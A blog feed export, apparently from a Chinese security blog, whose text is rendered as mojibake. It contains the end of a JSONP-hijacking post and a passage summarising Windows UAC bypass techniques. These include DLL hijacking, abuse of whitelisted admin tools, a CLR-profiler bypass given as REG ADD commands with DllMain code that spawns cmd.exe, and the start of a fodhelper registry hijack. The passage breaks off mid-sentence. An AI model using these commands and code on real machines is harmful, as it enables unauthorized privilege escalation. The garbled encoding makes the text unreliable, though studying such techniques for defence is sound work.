è¾“ID,PASSWDç­‰ä¿¡æ¯ï¼Œè¿™æ˜¯å‰æã€‚<br>ç”¨æˆ·ç™»å½•Båï¼Œæ‰“å¼€äº†æˆ‘ä»¬çš„æ¶æ„ç½‘ç«™A.com,A.comçš„å†…å®¹ä¸º:</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot; src&#x3D;&quot;http:&#x2F;&#x2F;B.com&#x2F;user?jsonp&#x3D;Callback&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">function Callback(result)</span><br><span class="line">&#123;</span><br><span class="line">    å°†è·å–å†…å®¹ä¸Šä¼ è‡³æ¶æ„æœåŠ¡å™¨çš„JSä»£ç .....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆAç½‘ç«™å°±ä¼šå‘ç½‘ç«™Bè·¨åŸŸè¯·æ±‚åˆ°æ•æ„Ÿä¿¡æ¯ï¼Œå¹¶ä¸Šä¼ åˆ°æ¶æ„æœåŠ¡å™¨ä¿å­˜ã€‚<br>è¿™å°±æ˜¯JSONPåŠ«æŒï¼Œæ­¤æ–¹æ³•å¸¸ç”¨äºæ°´å‘æ”»å‡»</p><h2 id="å¸¸ç”¨è§¦å‘ç‚¹ä¸bypass"><a href="#å¸¸ç”¨è§¦å‘ç‚¹ä¸bypass" class="headerlink" title="å¸¸ç”¨è§¦å‘ç‚¹ä¸bypass"></a>å¸¸ç”¨è§¦å‘ç‚¹ä¸bypass</h2><p><a href="https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html">https://wooyun.js.org/drops/Bypass%20xss%E8%BF%87%E6%BB%A4%E7%9A%84%E6%B5%8B%E8%AF%95%E6%96%B9%E6%B3%95.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;&lt;h1 id=&quot;åŒæºç­–ç•¥ä¸è·¨åŸŸ&quot;&gt;&lt;a href=&quot;#åŒæºç­–ç•¥ä¸è·¨åŸŸ&quot; class=&quot;headerlink&quot; title=&quot;åŒæºç­–ç•¥ä¸è·¨åŸŸ&quot;&gt;&lt;/a&gt;åŒæºç­–ç•¥ä¸è·¨</summary>
      
    
    
    
    
    <category term="å¤–å›´æ‰“ç‚¹" scheme="http://const27.com/tags/%E5%A4%96%E5%9B%B4%E6%89%93%E7%82%B9/"/>
    
  </entry>
  
  <entry>
    <title>BypassUACæŠ€æœ¯æ€»ç»“</title>
    <link href="http://const27.com/2021/06/28/Bypass%20UAC/"/>
    <id>http://const27.com/2021/06/28/Bypass%20UAC/</id>
    <published>2021-06-28T13:52:05.780Z</published>
    <updated>2021-06-28T13:40:35.984Z</updated>
    
    <content type="html"><![CDATA[<h1 id="UAC"><a href="#UAC" class="headerlink" title="UAC"></a>UAC</h1><p>ç”¨æˆ·å¸æˆ·æ§åˆ¶ï¼ˆUser Account Controlï¼Œç®€å†™ä½œUAC)æ˜¯<a href="https://baike.baidu.com/item/%E5%BE%AE%E8%BD%AF">å¾®è½¯</a>å…¬å¸åœ¨å…¶[Windows Vista](<a href="https://baike.baidu.com/item/Windows">https://baike.baidu.com/item/Windows</a> Vista)åŠæ›´é«˜ç‰ˆæœ¬æ“ä½œç³»ç»Ÿä¸­é‡‡ç”¨çš„ä¸€ç§æ§åˆ¶æœºåˆ¶ï¼Œä¿æŠ¤ç³»ç»Ÿè¿›è¡Œä¸å¿…è¦çš„æ›´æ”¹ï¼Œæå‡æ“ä½œç³»ç»Ÿçš„ç¨³å®šæ€§å’Œå®‰å…¨æ€§ã€‚<br>ç®¡ç†å‘˜åœ¨æ­£å¸¸æƒ…å†µä¸‹æ˜¯ä»¥ä½æƒé™è¿è¡Œä»»åŠ¡çš„ï¼Œè¿™ä¸ªçŠ¶æ€è¢«ç§°ä¸ºè¢«ä¿æŠ¤çš„ç®¡ç†å‘˜ã€‚ä½†å½“ç®¡ç†å‘˜è¦æ‰§è¡Œé«˜é£é™©æ“ä½œï¼ˆå¦‚å®‰è£…ç¨‹åºç­‰ï¼‰ï¼Œå°±éœ€è¦æå‡æƒé™å»å®Œæˆè¿™äº›ä»»åŠ¡ã€‚è¿™ä¸ªæå‡æƒé™çš„è¿‡ç¨‹é€šå¸¸æ˜¯è¿™æ ·çš„ï¼Œç›¸ä¿¡å„ä½éƒ½çœ¼ç†Ÿè¿‡ã€‚</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210227191310985.png" alt="image-20210227191310985"></p><p>ç‚¹å‡»â€œæ˜¯â€ï¼Œç®¡ç†å‘˜å°±ä¼šæå‡åˆ°é«˜æƒé™å†å»è¿è¡Œè¯¥ä»»åŠ¡ã€‚</p><h1 id="autoElevateä¸requestedExecutionLevel"><a href="#autoElevateä¸requestedExecutionLevel" class="headerlink" title="autoElevateä¸requestedExecutionLevel"></a>autoElevateä¸requestedExecutionLevel</h1><h2 id="autoElevate"><a href="#autoElevate" class="headerlink" title="autoElevate"></a>autoElevate</h2><p>å½“æŸä¸ªEXEæ–‡ä»¶çš„æ–‡ä»¶æ¸…å•é‡Œæœ‰&lt;autoElevate&gt; å…ƒç´ æ—¶ï¼Œå½“æ‰§è¡Œè¯¥æ–‡ä»¶æ—¶ä¼šé»˜è®¤ææƒæ‰§è¡Œã€‚<br>æˆ‘ä»¬åŠ«æŒè¯¥exeæ–‡ä»¶çš„dllï¼Œå¯ä»¥è¾¾åˆ°Bypass UACææƒçš„ç›®çš„ã€‚<br>é€‚ç”¨èŒƒå›´:ç®¡ç†å‘˜æƒé™ä»¥è·å¾—ï¼Œè¦å¾—åˆ°é«˜æƒé™ç®¡ç†å‘˜æƒé™</p><p>ä¸€èˆ¬ç”¨å·¥å…·sigcheckæ£€æµ‹</p><p>ç½‘ä¸Šå¸¸æ‹¿C:\Windows\SysWOW64\SystemPropertiesAdvanced.exe ä¸¾åˆ—å­</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000136728.png" alt="image-20210301000136728"></p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301000141880.png" alt="image-20210301000141880"></p><p>è¿™ä¸ªä¸œè¥¿å¾ˆæœ‰ç”¨ï¼Œæ˜¯ä¸‹é¢éƒ¨åˆ†æ–¹æ³•çš„å‰ææ¡ä»¶</p><h2 id="requestedExecutionLevel"><a href="#requestedExecutionLevel" class="headerlink" title="requestedExecutionLevel"></a>requestedExecutionLevel</h2><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125607741.png" alt="image-20210302125607741"></p><p>æœ‰ä¸‰ä¸ªä¸åŒçš„å‚æ•°ï¼šasInvoker requireAdministrator highestAvailable åˆ†åˆ«å¯¹åº”åº”ç”¨ç¨‹åºä»¥ä»€ä¹ˆæƒé™è¿è¡Œ</p><p>asInvokerï¼šçˆ¶è¿›ç¨‹æ˜¯ä»€ä¹ˆæƒé™ï¼Œæ­¤åº”ç”¨ç¨‹åºå°±æ˜¯ä»€ä¹ˆæƒé™</p><p>requireAdministratorï¼šéœ€è¦ä»¥ç®¡ç†å‘˜æƒé™æ¥è¿è¡Œï¼Œæ­¤ç±»åº”ç”¨ç¨‹åºå›¾æ ‡å³ä¸‹æ–¹ä¼šæœ‰ä¸ªç›¾ç‰Œæ ‡è®°<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302125851318.png" alt="image-20210302125851318"></p><p>highestAvailableï¼šæ­¤ç¨‹åºä»¥å½“å‰ç”¨æˆ·èƒ½è·å–åˆ°çš„æœ€é«˜æƒé™è¿è¡Œã€‚å½“ä½ åœ¨ç®¡ç†å‘˜è´¦æˆ·ä¸‹è¿è¡Œæ­¤ç¨‹åºå°±ä¼šè¦æ±‚æƒé™æå‡ä»¥åŠå¼¹å‡ºUACæ¡†ã€‚å½“ä½ åœ¨æ ‡å‡†è´¦æˆ·ä¸‹è¿è¡Œæ­¤ç¨‹åºï¼Œç”±äºæ­¤è´¦æˆ·çš„æœ€é«˜æƒé™å°±æ˜¯æ ‡å‡†è´¦æˆ·ï¼Œæ‰€ä»¥åŒå‡»ä¾¿è¿è¡Œ</p><h1 id="ç™½åå•ç¨‹åº"><a href="#ç™½åå•ç¨‹åº" class="headerlink" title="ç™½åå•ç¨‹åº"></a>ç™½åå•ç¨‹åº</h1><p>é™¤äº†åˆšåˆšè¯´çš„autoelevateï¼Œè¿˜æœ‰ä¸€ç±»å«ç™½åå•ç¨‹åºçš„åº”ç”¨ç¨‹åºä¹Ÿæ˜¯æ‰“å¼€é»˜è®¤ææƒçš„ã€‚å¦‚æœåŠ¡ç®¡ç†å·¥å…·ä¸‹çš„è®¸å¤šåº”ç”¨éƒ½å±äºç™½åå•ç¨‹åºï¼Œè€Œå…¶ä¸­åˆæœ‰äº›ç¨‹åºæ‰§è¡Œæ—¶éœ€è¦ä¾èµ–CLRæ”¯æŒï¼ˆå¦‚äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œä»»åŠ¡è®¡åˆ’ç¨‹åºï¼‰</p><h1 id="Bypass-UAC"><a href="#Bypass-UAC" class="headerlink" title="Bypass UAC"></a>Bypass UAC</h1><h2 id="DLLåŠ«æŒ"><a href="#DLLåŠ«æŒ" class="headerlink" title="DLLåŠ«æŒ"></a>DLLåŠ«æŒ</h2><p>reference:<a href="https://www.anquanke.com/post/id/209033">https://www.anquanke.com/post/id/209033</a><br><a href="https://www.cnblogs.com/0daybug/p/11719541.html">https://www.cnblogs.com/0daybug/p/11719541.html</a></p><p>exeæ–‡ä»¶è¿è¡Œæ—¶ä¼šåŠ è½½è®¸å¤šdllæ–‡ä»¶ï¼Œè¿™äº›dllæ–‡ä»¶çš„åŠ è½½é¡ºåºæ˜¯</p><ul><li><p>ç¨‹åºæ‰€åœ¨ç›®å½•</p></li><li><p>ç³»ç»Ÿç›®å½•å³<code>SYSTEM32</code>ç›®å½•</p></li><li><p>16ä½ç³»ç»Ÿç›®å½•å³<code>SYSTEM</code>ç›®å½•</p></li><li><p><code>Windows</code>ç›®å½•</p></li><li><p>ç¨‹åºåŠ è½½ç›®å½•(<code>SetCurrentDirecctory</code>)</p></li><li><p><code>PATH</code>ç¯å¢ƒå˜é‡ä¸­åˆ—å‡ºçš„ç›®å½•</p><p>åŒæ—¶ï¼ŒdllåŠ è½½ä¹Ÿéµå¾ªç€<code>Know DLLsæ³¨å†Œè¡¨é¡¹</code>çš„æœºåˆ¶ï¼šKnow DLLsæ³¨å†Œè¡¨é¡¹æŒ‡å®šçš„DLLæ˜¯å·²ç»è¢«æ“ä½œç³»ç»ŸåŠ è½½è¿‡åçš„DLLï¼Œä¸ä¼šè¢«åº”ç”¨ç¨‹åºæœç´¢å¹¶åŠ è½½ã€‚åœ¨æ³¨å†Œè¡¨HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLSå¤„å¯ä»¥çœ‹è§è¿™äº›dll</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210301184035776.png" alt="image-20210301184035776"></p></li></ul><p>åœ¨knowdllsè¡¨é¡¹ä¸­çš„dllæ˜¯é¢„å…ˆå°±åŠ è½½è¿›å†…å­˜ç©ºé—´çš„ï¼Œè¢«è¯¸å¤šåº”ç”¨è°ƒç”¨ç€ï¼Œæ”¹åŠ¨éœ€è¦é«˜æƒé™ã€‚</p><p>å¦‚æœæˆ‘ä»¬åœ¨åº”ç”¨ç¨‹åºæ‰¾åˆ°æ­£ç¡®çš„dllä¹‹å‰ï¼Œå°†æˆ‘ä»¬è‡ªå·±åˆ›é€ çš„dllæ”¾å…¥ä¼˜å…ˆçº§æ›´é«˜çš„æœç´¢ç›®å½•è®©åº”ç”¨ç¨‹åºä¼˜å…ˆåŠ è½½æ­¤dllæ–‡ä»¶ï¼Œè¿™å°±é€ æˆäº†dllåŠ«æŒã€‚ä½†è¿™åªæ˜¯dllåŠ«æŒçš„å…¶ä¸­ä¸€ç§é€”å¾„ï¼Œä»–æœ‰è¿™äº›é€”å¾„ï¼š</p><p>ï¼ˆ1ï¼‰ DLLæ›¿æ¢ï¼šç”¨æ¶æ„çš„DLLæ›¿æ¢æ‰åˆæ³•çš„DLL<br>ï¼ˆ2ï¼‰ DLLæœç´¢é¡ºåºåŠ«æŒï¼šå½“åº”ç”¨ç¨‹åºåŠ è½½DLLçš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰å¸¦æŒ‡å®šDLLçš„è·¯å¾„ï¼Œé‚£ä¹ˆç¨‹åºå°†ä¼šä»¥ç‰¹å®šçš„é¡ºåºä¾æ¬¡åœ¨æŒ‡å®šçš„è·¯å¾„ä¸‹æœç´¢å¾…åŠ è½½çš„DLLã€‚é€šè¿‡å°†æ¶æ„DLLæ”¾åœ¨çœŸå®DLLä¹‹å‰çš„æœç´¢ä½ç½®ï¼Œå°±å¯ä»¥åŠ«æŒæœç´¢é¡ºåºï¼ŒåŠ«æŒçš„ç›®å½•æœ‰æ—¶å€™åŒ…æ‹¬ç›®æ ‡åº”ç”¨ç¨‹åºçš„å·¥ä½œç›®å½•ã€‚<br>ï¼ˆ3ï¼‰ è™šæ‹ŸDLLåŠ«æŒï¼šé‡Šæ”¾ä¸€ä¸ªæ¶æ„çš„DLLæ¥ä»£æ›¿åˆæ³•åº”ç”¨ç¨‹åºåŠ è½½çš„ä¸¢å¤±/ä¸å­˜åœ¨çš„DLL<br>ï¼ˆ4ï¼‰ DLLé‡å®šå‘ï¼šæ›´æ”¹DLLæœç´¢çš„è·¯å¾„ï¼Œæ¯”å¦‚é€šè¿‡ç¼–è¾‘%PATH%ç¯å¢ƒå˜é‡æˆ– .exe.manifest/.exe.localæ–‡ä»¶ä»¥å°†æœç´¢è·¯å¾„å®šä½åˆ°åŒ…å«æ¶æ„DLLçš„åœ°æ–¹ã€‚<br>ï¼ˆ5ï¼‰ WinSxS DLLæ›¿æ¢ï¼šå°†ç›®æ ‡DLLç›¸å…³çš„WinSxSæ–‡ä»¶å¤¹ä¸­çš„æ¶æ„DLLæ›¿æ¢ä¸ºåˆæ³•çš„DLLã€‚æ­¤æ–¹æ³•é€šå¸¸ä¹Ÿè¢«ç§°ä¸ºDLLä¾§åŠ è½½<br>ï¼ˆ6ï¼‰ ç›¸å¯¹è·¯å¾„DLLåŠ«æŒï¼šå°†åˆæ³•çš„åº”ç”¨ç¨‹åºå¤åˆ¶ï¼ˆå¹¶æœ‰é€‰æ‹©åœ°é‡å‘½åï¼‰ä¸æ¶æ„çš„DLLä¸€èµ·æ”¾å…¥åˆ°ç”¨æˆ·å¯å†™çš„æ–‡ä»¶å¤¹ä¸­ã€‚åœ¨ä½¿ç”¨æ–¹æ³•ä¸Šï¼Œå®ƒä¸ï¼ˆç­¾åçš„ï¼‰äºŒè¿›åˆ¶ä»£ç†æ‰§è¡Œæœ‰ç›¸ä¼¼ä¹‹å¤„ã€‚å®ƒçš„ä¸€ä¸ªå˜ä½“æ˜¯ï¼ˆæœ‰ç‚¹çŸ›ç›¾åœ°ç§°ä¸ºï¼‰â€œè‡ªå¸¦LOLbinâ€ï¼Œå…¶ä¸­åˆæ³•çš„åº”ç”¨ç¨‹åºå¸¦æœ‰æ¶æ„çš„DLLï¼ˆè€Œä¸æ˜¯ä»å—å®³è€…æœºå™¨ä¸Šçš„åˆæ³•ä½ç½®å¤åˆ¶ï¼‰ã€‚</p><h4 id="å®è·µå‡ºçœŸçŸ¥1"><a href="#å®è·µå‡ºçœŸçŸ¥1" class="headerlink" title="å®è·µå‡ºçœŸçŸ¥1"></a>å®è·µå‡ºçœŸçŸ¥1</h4><p>è¿™é‡Œæˆ‘ä»¬å…ˆç”¨ç¬¬ä¸€ç§æ–¹æ³•æ¥è¿›è¡Œå®éªŒï¼Œå®éªŒå¯¹è±¡æ˜¯C:\Windows\SysWOW64\SystemPropertiesAdvanced.exeå’ŒListaryã€‚Listaryæ˜¯ä¸€ä¸ªå¾ˆå¥½ç”¨çš„æ£€ç´¢å°å·¥å…·ï¼Œæˆ‘é€šè¿‡processmonitorï¼Œè®¾ç½®å¥½è¿‡æ»¤æ¡ä»¶ï¼ŒæŸ¥çœ‹SystemPropertiesAdvanced.exeè°ƒç”¨çš„dllæ—¶å‘ç°å®ƒä¼šè°ƒç”¨ä¸€ä¸ªListaryä¸‹çš„ä¸€ä¸ªåä¸ºListaryHook.dllçš„dllã€‚<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132631680.png" alt="image-20210302132631680"></p><p>ç”±äºlistaryç›®å½•æƒé™ä¸é«˜ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ›¿æ¢è¯¥dllï¼Œæ¢æˆdllmainä¸ºæ‰“å¼€cmdçš„dllã€‚ç„¶åç‚¹å‡»è¿è¡ŒSystemPropertiesAdvanced.exeï¼Œå°±ä¼šå‘ç°ä¼šå¼¹å‡ºé«˜æƒé™cmdçª—å£<img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302132724843.png" alt="image-20210302132724843"></p><p>bypassuacæˆåŠŸã€‚ å½“ç„¶è¿™ç§éƒ½ä¸èƒ½ç®—æ˜¯ä¸€ä¸ªæ´ï¼Œlistaryå¹¶ä¸æ˜¯äººäººç”µè„‘ä¸Šéƒ½æœ‰çš„ï¼Œè€Œä¸”è¿™ä¸ªè½¯ä»¶è£…æœºé‡åº”è¯¥æ˜¯æå°‘æ•°å°‘çš„ï¼Œæ‰€ä»¥è¿™é‡Œåªæ˜¯æä¾›ä¸€ä¸ªæ€è·¯ï¼Œè¿™ç§æ´è¯¥æ€ä¹ˆå»æ‰¾ã€‚</p><h4 id="å®è·µå‡ºçœŸçŸ¥2"><a href="#å®è·µå‡ºçœŸçŸ¥2" class="headerlink" title="å®è·µå‡ºçœŸçŸ¥2"></a>å®è·µå‡ºçœŸçŸ¥2</h4><p>è¿™é‡Œä½¿ç”¨ç¬¬ä¸‰ç§æ–¹æ³•è¿›è¡Œå®éªŒï¼Œå®éªŒå¯¹è±¡æ˜¯eventvwr.mscï¼Œå®ƒæ˜¯ç®¡ç†å·¥å…·ä¸­çš„äº‹ä»¶æŸ¥çœ‹å™¨ï¼Œå®ƒä¾èµ–äºmmc.exeæ¥è¿è¡Œã€‚æ¯”å¦‚ï¼Œä½ æƒ³è¿è¡Œå®ƒï¼Œå°±å¾—é€šè¿‡mmc eventvwr.mscæ¥è¿è¡Œå®ƒ,å¹¶ä¸”åœ¨process exploerä¸­åªèƒ½çœ‹åˆ°ä¸ªmmc.exeã€‚</p><p>æˆ‘ä»¬process monitorè®¾ç½®è¿‡æ»¤å¦‚ä¸‹</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302205938167.png" alt="image-20210302205938167"></p><p>cmdè¿è¡Œ mmc eventvwr.msc,æŸ¥çœ‹è°ƒç”¨</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302210053342.png" alt="image-20210302210053342"></p><p>dllæœç´¢é¡ºåºç¡®å®æ˜¯ ç¨‹åºç›®å½•-&gt;SYSTEM32-&gt;SYSTEM-&gt;WINDOWS-&gt;å½“å‰ç›®å½•ï¼ˆè¿™é‡Œä¹Ÿæ˜¯SYSTEM32ç›®å½•ï¼Œæˆ‘è®¤ä¸ºçš„åŸå› æ˜¯mmcä¼šè‡ªåŠ¨æå‡æƒé™å¯¼è‡´å½“å‰ç›®å½•ä¸ºSystem32å¯¼è‡´çš„ï¼‰-&gt;PATHç›®å½•ã€‚</p><p>æˆ‘ä»¬åªéœ€åœ¨å¯å†™ç›®å½•ä¸‹æ¤å…¥åä¸ºelsext.dllçš„æ¶æ„dllï¼Œå¤„ç†å¥½dllçš„dllmainå‡½æ•°ï¼Œå°±èƒ½è®©dllmainé‡Œçš„æŒ‡ä»¤è¢«é«˜æƒé™æ‰§è¡Œ</p><p>ä½†æ˜¯æ— å¥ˆæˆ‘è¿™é‡Œç¯å¢ƒæ˜¯win7 sp1,ä½†æ˜¯è¿™ä¸ªæ´7600æ‰å‡ºç°ï¼Œæ‰€ä»¥å¤ç°ä¸äº†äº†ã€‚ä½†å¤§æ¦‚æ€è·¯å°±æ˜¯è¿™æ ·çš„</p><h2 id="CLRåŠ è½½ä»»æ„DLL"><a href="#CLRåŠ è½½ä»»æ„DLL" class="headerlink" title="CLRåŠ è½½ä»»æ„DLL"></a>CLRåŠ è½½ä»»æ„DLL</h2><p>CLRæ˜¯å¾®è½¯ä¸º.netè¿è¡Œæ—¶æä¾›çš„ç¯å¢ƒï¼Œåƒjavaçš„è™šæ‹Ÿæœºä¸€æ ·ï¼Œè€Œclræœ‰ä¸€ä¸ªProfilingæœºåˆ¶ã€‚è¿™ä¸ªæœºåˆ¶ç®€è€Œè¨€ä¹‹ä¾¿æ˜¯å¯ä»¥ç»™CLRæä¾›ä¸€ä¸ªdllï¼Œå½“ä»»ä½•é«˜æƒé™.NETè¿è¡Œæ—¶éƒ½ä¼šä¸»åŠ¨åŠ è½½è¯¥DLLï¼Œæˆ‘ä»¬å¯ä»¥æ„é€ æ¶æ„dllç»™CLRåŠ è½½ï¼Œä»è€Œè·å¾—é«˜æƒé™çš„è¿›ç¨‹å¦‚cmdï¼Œä»è€Œbypassuacã€‚</p><p>è‡³äºè¿™ä¸ªdllå¦‚ä½•ç»™CLRï¼Œæ˜¯é€šè¿‡ä¿®æ”¹ä»¥ä¸‹ç¯å¢ƒå˜é‡å®ç°çš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">COR_ENABLE_PROFILING &#x3D; 1</span><br><span class="line"></span><br><span class="line">COR_PROFILER&#x3D;&#123;CLSIDor ProgID&#125;</span><br></pre></td></tr></table></figure><p>CLRä¼šæ£€æŸ¥ç¯å¢ƒå˜é‡ä¸­çš„COR_ENABLE_PROFILINGï¼Œè‹¥ä¸º1åˆ™æ£€æŸ¥é€šè¿‡ï¼Œè¿›è¡Œä¸‹ä¸€æ­¥ã€‚<br>åœ¨net4.0ä»¥å‰ï¼Œè‹¥æ£€æŸ¥é€šè¿‡ï¼Œä¼šé©¬ä¸Šå»æŸ¥æ‰¾COR_PROFILERæŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹ï¼Œæ‰¾åˆ°å…¶dllè·¯å¾„å¹¶åŠ è½½<br>net4.0åï¼Œä¼šå…ˆæŸ¥æ‰¾COR_PROFILER_PATHæ˜¯å¦æŒ‡å®šdllæ–‡ä»¶è·¯å¾„ï¼Œè‹¥æ²¡æœ‰å†å»æŸ¥æ‰¾COR_PROFILERæŒ‡å®šçš„æ³¨å†Œè¡¨é¡¹ï¼Œæ‰¾åˆ°å…¶dllè·¯å¾„å¹¶åŠ è½½ã€‚<br>æ€»è€Œè¨€ä¹‹ï¼Œæˆ‘ä»¬è®¾ç½®å¥½COR_ENABLE_PROFILINGå’ŒCOR_PROFILERä¸¤ä¸ªé¡¹å°±å¯ä»¥äº†ã€‚</p><p>æ¥ä¸‹æ¥æˆ‘ä»¬è®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡ï¼Œè®¾ç½®ç”¨æˆ·ç¯å¢ƒå˜é‡æ—¶ä¸éœ€è¦é«˜æƒé™ï¼ˆwin10ä¼¼ä¹è®¾ç½®ç³»ç»Ÿç¯å¢ƒå˜é‡ä¹Ÿä¸éœ€è¦ï¼‰ã€‚<br>ä»¥åŠåœ¨æ³¨å†Œè¡¨ï¼Œåœ¨æŒ‡å®šçš„CLSIDå±æ€§ä¸‹æ–°å»ºInprocserver32é¡¹ï¼Œå¹¶å†™å…¥æ¶æ„dllè·¯å¾„. ç„¶åé€šè¿‡mmcè°ƒç”¨ä¸€ä¸‹gpedit.mscè¿™ç§ç¨‹åºï¼Œå³å¯ä»¥é«˜æƒé™æ‰§è¡Œdllã€‚å¦‚æœdllæ‰§è¡Œå‘½ä»¤ä¸ºsystem(â€œcmd.exeâ€)  é‚£ä¹ˆå°±ä¼šè¹¦å‡ºæ¥é«˜æƒé™cmdçª—å£</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">REG ADD &quot;HKCU\Software\Classes\CLSID\&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;\InprocServer32&quot; &#x2F;ve &#x2F;t REG_EXPAND_SZ &#x2F;d &quot;C:\test\calc.dll&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_PROFILER&quot; &#x2F;t REG_SZ &#x2F;d &quot;&#123;FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF&#125;&quot; &#x2F;f</span><br><span class="line">REG ADD &quot;HKCU\Environment&quot; &#x2F;v &quot;COR_ENABLE_PROFILING&quot; &#x2F;t REG_SZ &#x2F;d &quot;1&quot; &#x2F;f</span><br><span class="line">mmc gpedit.msc</span><br></pre></td></tr></table></figure><p>ä½†æˆ‘æ­»æ´»å¤ç°ä¸èµ·ä¸çŸ¥é“ä¸ºå•¥ï¼Œæˆ‘çš„dllè¿™æ ·å†™çš„</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; dllmain.cpp : å®šä¹‰ DLL åº”ç”¨ç¨‹åºçš„å…¥å£ç‚¹ã€‚</span><br><span class="line">#include &quot;pch.h&quot;</span><br><span class="line">#include &lt;iostream&gt;</span><br><span class="line">#include &lt;Windows.h&gt;</span><br><span class="line"></span><br><span class="line">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpReserved)</span><br><span class="line">&#123;</span><br><span class="line">    char cmd[] &#x3D; &quot;cmd.exe&quot;;</span><br><span class="line"></span><br><span class="line">    switch (fdwReason)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        WinExec(cmd, SW_SHOWNORMAL);</span><br><span class="line">        ExitProcess(0);</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦å¤–çš„ï¼Œä½ è¿˜å¯ä»¥ä¸ºCOR_PROFILER_PATHè®¾ç½®ä¸ºå¦‚\\server\share\test.dllçš„smbçš„è·¯å¾„ï¼Œè¿™æ ·ä¹Ÿå¯ä»¥å®ç°bypassuacï¼ˆæ²¡å¤ç°ï¼‰</p><h2 id="ç™½åå•ç¨‹åº-1"><a href="#ç™½åå•ç¨‹åº-1" class="headerlink" title="ç™½åå•ç¨‹åº"></a>ç™½åå•ç¨‹åº</h2><h3 id="odbcad32-exe"><a href="#odbcad32-exe" class="headerlink" title="odbcad32.exe"></a>odbcad32.exe</h3><p>è¿™ä¸ªæ–¹æ³•å¾ˆç®€å•ã€‚æ‰“å¼€C:\Windows\system32\odbcad32.exeï¼Œç„¶åé€šè¿‡ä»¥ä¸‹æ–¹æ³•æ‰“å¼€powershellæˆ–è€…cmd</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302133941728.png" alt="image-20210302133941728"></p><p>æˆåŠŸbypass</p><p><img src="https://const27blog.oss-cn-beijing.aliyuncs.com/img/image-20210302134014137.png" alt="image-20210302134014137"></p><h3 id="ç®¡ç†å·¥å…·"><a href="#ç®¡ç†å·¥å…·" class="headerlink" title="ç®¡ç†å·¥å…·"></a>ç®¡ç†å·¥å…·</h3><p>ä¹‹å‰è¯´è¿‡ï¼Œç®¡ç†å·¥å…·æœ‰å¾ˆå¤šç™½åå•ç¨‹åºï¼Œå¦‚æœä¸€ä¸ªç™½åå•ç¨‹åºæœ‰æµè§ˆæ–‡ä»¶ç›®å½•çš„åŠŸèƒ½ï¼Œå°±å¯ä»¥ä»¥æ­¤æ¥åˆ›å»ºé«˜æƒé™cmdçª—å£ã€‚è¿™é‡Œæ‹¿äº‹ä»¶æŸ¥çœ‹å™¨ä¸¾ä¾‹</p><p>æ“ä½œ-ã€‹æ‰“å¼€ä¿å­˜çš„ç›®å½•-ã€‹æ–‡ä»¶ç›®å½•è·¯å¾„å¤„è¾“å…¥powershell-ã€‹å¼¹å‡ºé«˜æƒé™powershell    ä»¥æ­¤å†…æ¨ï¼Œè¿˜æœ‰å¾ˆå¤šç›¸ä¼¼çš„ç®¡ç†å·¥å…·å¯ä»¥è¿™æ ·åˆ©ç”¨</p><h2 id="æ³¨å†Œè¡¨åŠ«æŒ"><a href="#æ³¨å†Œè¡¨åŠ«æŒ" class="headerlink" title="æ³¨å†Œè¡¨åŠ«æŒ"></a>æ³¨å†Œè¡¨åŠ«æŒ</h2><h3 id="Fodhelper-exe"><a href="#Fodhelper-exe" class="headerlink" title="Fodhelper.exe"></a>Fodhelper.exe</h3><p>Fodhelper.exe win10æ‰æœ‰ï¼Œæ‰€ä»¥åªæœ‰win10èƒ½é€šè¿‡è¿™ä¸ªåŠæ³•bypassuacï¼Œä»–æ˜¯ä¸€ä¸ªautoelevateå…ƒç´ 